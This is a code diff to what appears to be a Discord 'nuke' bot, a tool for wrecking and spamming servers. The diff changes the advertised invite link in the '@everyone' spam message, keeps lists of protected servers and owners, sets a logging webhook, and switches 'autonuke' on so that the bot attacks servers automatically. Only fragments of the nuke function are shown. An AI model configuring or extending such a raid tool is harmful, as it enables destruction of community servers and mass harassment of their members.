@@ -6,7 +6,7 @@ import random
 protected_servers = [1099524145672359966, 1091190474049589248] # Add server ID seperated by a single comma
 owner_ids = [1090223367879131207] # Add user ID seperated by a single comma
 
-nuke_message = "@everyone discord.gg/might"
+nuke_message = "@everyone discord.gg/vernon"
 nuke_channel_name = "fun"
 bot_prefix = "!"
 
@@ -15,7 +15,7 @@ log_settings = {
     'log_webhook': 'https://discord.com/api/webhooks/123/abc' # This is where the logs will be sent
 }
 
-autonuke = False # Change to True for autonuke
+autonuke = True # Change to True for autonuke
 
 bot_token = "" # Find this on the discord developer portal
 
@@ -65,7 +65,7 @@ async def nuke(ctx):
         except:
             pass
     
-    invite = "discord.gg/might"
+    invite = "discord.gg/vernon"
     try:
         invite = await random.choice(guild.text_channels).create_invite()
     except:
